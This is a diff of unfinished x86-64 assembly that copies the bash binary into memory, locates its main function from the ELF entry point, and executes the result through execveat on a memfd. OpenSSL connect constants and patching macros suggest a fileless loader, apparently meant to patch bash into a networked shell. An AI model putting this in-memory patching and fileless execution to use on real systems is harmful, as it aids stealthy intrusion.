@@ -64,7 +64,14 @@ BITS 64
 %define BIO_C_SET_CONNECT   0x64
 
 ; 5mb, as a yolo
-%define STACKSPACE 0x500000
+%define STACKSPACE          0x500000
+
+; useful offsets
+%define e_entry_offset      24
+; e_entry + 27 is the lea we want.
+%define main_offset         27
+; 31 is the rip offset we need
+%define main_rip_offset     31
 
 ; Macros, these two are used for the patch
 %macro resolve_symbol 2
@@ -81,7 +88,8 @@ BITS 64
 
 ; register usage
 ; rsp - points the buffer we are using to start the copy of bash.
-; r12 - length of bash
+; r12 - length of the bash binary
+; r13 - offset to main
 
 _start:
     push rbp
@@ -103,7 +111,17 @@ _open_bin:
     mov r12, rax
 
 _discover_main:
-    
+    xor rdx, rdx
+    mov rax, [rsp + e_entry_offset]
+    mov r13, rax
+    add rax, rsp
+    add rax, main_offset
+    ; so rax is now a signed 32bit int.
+    mov rax, [rax]
+    cdqe
+    add r13, rax
+    add r13, main_rip_offset
+    jmp _inf
 
 _find_rela:
 
@@ -131,9 +149,8 @@ _execve_memfd:
     mov rax, SYS_execveat
     syscall
 
-
-_inf_main:
-    jmp _inf_main
+; end of the code
+    jmp _inf
 
 ; move into ELF header
 _str_bash:
